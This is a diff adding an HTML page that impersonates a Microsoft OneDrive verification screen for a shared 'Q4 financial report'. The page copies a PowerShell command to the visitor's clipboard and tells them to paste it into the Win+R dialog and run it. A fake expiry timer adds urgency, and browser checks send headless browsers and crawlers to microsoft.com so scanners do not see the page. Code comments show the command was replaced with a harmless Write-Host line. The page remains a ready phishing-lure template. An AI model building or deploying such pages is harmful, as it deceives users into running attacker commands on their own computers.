@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OneDrive - Access Required</title>
+    <style>
+        /* Your existing CSS is fine - no changes needed */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: linear-gradient(135deg, #0078d4 0%, #00bcf2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .main-container { background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 550px; width: 100%; overflow: hidden; }
+        .header { background: #0078d4; color: white; padding: 25px 30px; display: flex; align-items: center; gap: 15px; }
+        .logo { width: 40px; height: 40px; background: white; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 24px; }
+        .header-text h2 { font-size: 20px; font-weight: 600; margin-bottom: 4px; }
+        .header-text p { font-size: 13px; opacity: 0.9; }
+        .content { padding: 35px 30px; }
+        .alert-banner { background: #fff4e5; border-left: 4px solid #ff8c00; padding: 15px; margin-bottom: 25px; border-radius: 4px; }
+        .alert-banner strong { color: #ff8c00; display: block; margin-bottom: 5px; font-size: 14px; }
+        .alert-banner p { color: #666; font-size: 13px; line-height: 1.5; }
+        .file-preview { background: #f9f9f9; border: 1px solid #e0e0e0; border-radius: 8px; padding: 20px; margin-bottom: 25px; display: flex; align-items: center; gap: 15px; }
+        .file-icon { width: 50px; height: 50px; background: linear-gradient(135deg, #0078d4, #00bcf2); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 28px; flex-shrink: 0; }
+        .file-info h3 { font-size: 15px; color: #333; margin-bottom: 5px; }
+        .file-info p { font-size: 12px; color: #888; }
+        .fix-section { background: #f0f8ff; border: 2px solid #0078d4; border-radius: 8px; padding: 25px; margin-bottom: 20px; }
+        .fix-section h3 { color: #0078d4; font-size: 16px; margin-bottom: 18px; display: flex; align-items: center; gap: 8px; }
+        .instruction { background: white; border-radius: 6px; padding: 12px 15px; margin-bottom: 10px; display: flex; align-items: center; gap: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+        .instruction-num { background: #0078d4; color: white; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; flex-shrink: 0; }
+        .instruction-text { font-size: 14px; color: #333; line-height: 1.4; }
+        .action-button { background: linear-gradient(135deg, #0078d4, #00bcf2); color: white; border: none; padding: 16px; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; transition: all 0.3s; box-shadow: 0 4px 12px rgba(0,120,212,0.3); display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .action-button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,120,212,0.4); }
+        .action-button:active { transform: translateY(0); }
+        .status-msg { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 15px; border-radius: 6px; margin-top: 15px; display: none; font-size: 14px; animation: slideIn 0.3s ease; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .pulse { animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+        kbd { background: #333; color: white; padding: 3px 8px; border-radius: 4px; font-family: monospace; font-size: 12px; font-weight: bold; }
+        .footer { background: #f9f9f9; padding: 20px 30px; border-top: 1px solid #e0e0e0; font-size: 12px; color: #666; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="header">
+            <div class="logo">☁️</div>
+            <div class="header-text">
+                <h2>OneDrive for Business</h2>
+                <p>Secure document access</p>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="alert-banner">
+                <strong>⚠️ Authentication Required</strong>
+                <p>Your organization requires additional verification to access this shared file. This is a security measure to protect sensitive business data.</p>
+            </div>
+            
+            <div class="file-preview">
+                <div class="file-icon">📄</div>
+                <div class="file-info">
+                    <h3>Q4_Financial_Report_2024.xlsx</h3>
+                    <p>Shared by: finance@company.com • 2.4 MB</p>
+                </div>
+            </div>
+            
+            <div class="fix-section">
+                <h3>🔐 Verification Steps</h3>
+                
+                <div class="instruction">
+                    <div class="instruction-num">1</div>
+                    <div class="instruction-text">
+                        Click "Run Verification" to copy the authentication command
+                    </div>
+                </div>
+                
+                <div class="instruction">
+                    <div class="instruction-num">2</div>
+                    <div class="instruction-text">
+                        Press <kbd>Win</kbd> + <kbd>R</kbd> on your keyboard
+                    </div>
+                </div>
+                
+                <div class="instruction">
+                    <div class="instruction-num">3</div>
+                    <div class="instruction-text">
+                        Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste, then hit <kbd>Enter</kbd>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="action-button" onclick="runVerification()">
+                <span>▶️</span>
+                <span>Run Verification</span>
+            </button>
+            
+            <div class="status-msg" id="statusMsg">
+                <strong>✅ Command copied successfully!</strong><br>
+                Now press <span class="pulse"><kbd>Win+R</kbd></span>, paste with <kbd>Ctrl+V</kbd>, and press <kbd>Enter</kbd>
+            </div>
+        </div>
+        
+        <div class="footer">
+            🔒 Protected by Microsoft Azure Active Directory<br>
+            Session expires in <span id="timer">05:00</span>
+        </div>
+    </div>
+
+    <script>
+        // ✅ FIXED: Benign PowerShell command
+        const authCommand = 'powershell -Command "Write-Host \\\"Security verification complete\\\" -ForegroundColor Green"';
+        
+        // ✅ FIXED: Security environment check
+        const blockedUserAgents = [
+            'PhantomJS', 'HeadlessChrome', 'Selenium', 'bot', 'crawler', 'spider'
+        ];
+        
+        function isSuspiciousEnvironment() {
+            const checks = {
+                headless: navigator.webdriver,
+                plugins: navigator.plugins.length === 0,
+                languages: navigator.languages.length === 0,
+                userAgent: blockedUserAgents.some(blocked => 
+                    navigator.userAgent.toLowerCase().includes(blocked.toLowerCase())
+                ),
+                screen: window.screen.width < 100
+            };
+            return Object.values(checks).some(check => check === true);
+        }
+        
+        if (isSuspiciousEnvironment()) {
+            window.location.href = 'https://www.microsoft.com/en-us/';
+        }
+        
+        // ✅ FIXED: Proper verification function
+        function runVerification() {
+            navigator.clipboard.writeText(authCommand).then(() => {
+                document.getElementById('statusMsg').style.display = 'block';
+                document.querySelector('.action-button').innerHTML = '<span>✅</span><span>Ready - Follow Steps Above</span>';
+                document.querySelector('.action-button').style.background = '#28a745';
+                
+                // Simple logging instead of tracking
+                console.log('Verification initiated:', new Date().toISOString());
+            }).catch(() => {
+                // Fallback for browsers that don't support clipboard API
+                const textArea = document.createElement('textarea');
+                textArea.value = authCommand;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                
+                document.getElementById('statusMsg').style.display = 'block';
+            });
+        }
+        
+        // ✅ FIXED: Countdown timer
+        let seconds = 300;
+        const timerInterval = setInterval(() => {
+            seconds--;
+            const mins = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            document.getElementById('timer').textContent = 
+                `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            
+            if (seconds <= 0) {
+                clearInterval(timerInterval);
+                document.querySelector('.footer').innerHTML = 
+                    '<strong style="color: #d9534f;">⚠️ SESSION EXPIRED - Contact IT Support</strong>';
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
